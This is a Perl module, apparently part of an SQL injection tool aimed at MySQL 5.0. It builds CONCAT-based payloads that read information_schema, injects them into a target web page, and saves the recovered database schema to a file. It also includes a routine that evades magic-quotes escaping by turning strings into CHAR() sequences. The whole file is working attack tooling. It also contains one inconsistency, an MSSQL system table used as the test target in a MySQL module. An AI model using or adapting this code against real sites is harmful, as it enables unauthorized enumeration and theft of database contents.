package isr_mysql;
use Data::Dump qw(dump);

#Author: Francisco Amato

#Tested in mysql version 5.0.18-standard-log
my $version="5.0.18-standard-log";

my @space=(' ',"\t","/**/");
#Atributos publicos

#Private variable
@db_errors = (
	    {
             'code'  	=>'',
             'message'  =>'',
             'type'     =>0
            }
	    );

my @col_testpage=('NAME');
my $name_test="master.dbo.sysdatabases";

my @col_dbsnames=('SCHEMA_NAME');
my $name_dbsnames="information_schema.schemata";

my @col_dbschema=('information_schema.TABLES.TABLE_SCHEMA', 'information_schema.TABLES.TABLE_NAME', 'COLUMN_NAME', 'DATA_TYPE');
my $name_dbschema="information_schema.COLUMNS INNER JOIN information_schema.TABLES ON information_schema.TABLES.TABLE_NAME=information_schema.COLUMNS.TABLE_NAME";

#Constructor y destructor de clase
sub new {
    my $classname = shift;
    my $class = {@_};

    #Atributos de instancia

    bless $class, $classname;
    return $class;
}

# Accessores y mutadores
sub get_testpage { my $class = shift; return $class->{testpage};}
sub get_dbschema { my $class = shift; return $class->{dbschema};}
sub get_dbsnames { my $class = shift; return $class->{dbsnames};}

#Public method
sub do_testpage {
    my $class = shift;
    $class->{testpage}=process_page($class,$name_test,undef,undef,undef,@col_testpage);
}

sub do_dbsnames {
    my $class = shift;
    $class->{error} = "Dbsnames not implement\n";
    $class->{dbsnames} = -1; # not implement
}


sub do_dbschema {
    my $class = shift;
    $class->{dbschema}=process_page($class,$name_dbschema,-1,undef,undef,@col_dbschema);
    die "Error: " . $class->{error} if ($class->{error});

    open(FF, "> ./template/$class->{conn}->{'session'}.dbschema");
        print FF $class->get_dbschema;
    close(FF);

}



#Private method
sub process_page{
    my ($class,$table,$coltype,$where,$tail,@col) = @_;
    my $datos=$class->{conn}->{'inj'};
    my $val;

    my @ncol;
    
    #print dump(@col);
    #convert output of charset
    if ($class->{conn}->{mysql_cvt}){
	@ncol = map "convert($_ using $class->{conn}->{mysql_cvt_type})" ,@col;	
    }else{
	@ncol = @col;
    }
    
    #select type of concat
    $val = &getconcat(@ncol);

    #where
    my $mwhere;
    if($where){ #exist structure where
        $mwhere = "where $where";
        if ($class->{conn}->{'where'}){ #user define where
            $mwhere .= " and $class->{conn}->{'where'}";
        }
    }elsif($class->{conn}->{'where'}){
        $mwhere="where $class->{conn}->{'where'}";
    }

    #tail
    my $mtail=$class->{conn}->{'tail'};
    
    $datos=~ s/\<VALUE\>/$val/gi;
    $datos=~ s/\<TABLE\>/$table/gi;
    $datos=~ s/\<WHERE\>/$mwhere/gi;
    $datos=~ s/\<TAIL\>/$mtail/gi;

    #Magic quotes evasion
    $datos =~ s/'([^']+)'/magicquotes($1)/egi if $class->{conn}->{'magicquotes'}; #'	
    
    $class->{lastinj}=$datos;
    $class->{conn}->getpage("",$datos);
    if ($class->{conn}->{code} == 404){
	$class->{error} = "Error 404\n";
    }else{
#	$class->{error}=check_errors($class->{conn}->{response});
    }
    return $class->{conn}->{response};
}

sub magicquotes {
    my ($val) = @_;
    my @list= map { $_ = 'CHAR('.$_.')' } unpack('C*', $val);
    my $return = &getconcat(@list);
    $return =~ s/,'\[\_\_\]',/,/gi;
    return $return;
}
		    

sub check_errors {
    my ($response) = @_;
    my $ret="";
    foreach my $item (@db_errors){
	if ($response =~ /$item->{'code'}/){
	    $ret.="Code: $item->{'code'}, Detail: $item->{'message'}\n";
	}
    }
    return $ret;
}

sub getconcat {
        my (@items) =@_;
        my $can=$#items;
        my $str='';
        for (my $i=0;$i <=$can;$i++)
        {
	    $str .=",'[__]'," if ($str);
            $str.= getvalue($items[$i]);
        }
	$str = "CONCAT(" . $str .")";
        return $str;
}

sub getvalue {
    my ($str) = @_;
    if ($str){
        return $str;
    }else{
        return "'".$str."'";
    }
}
1;
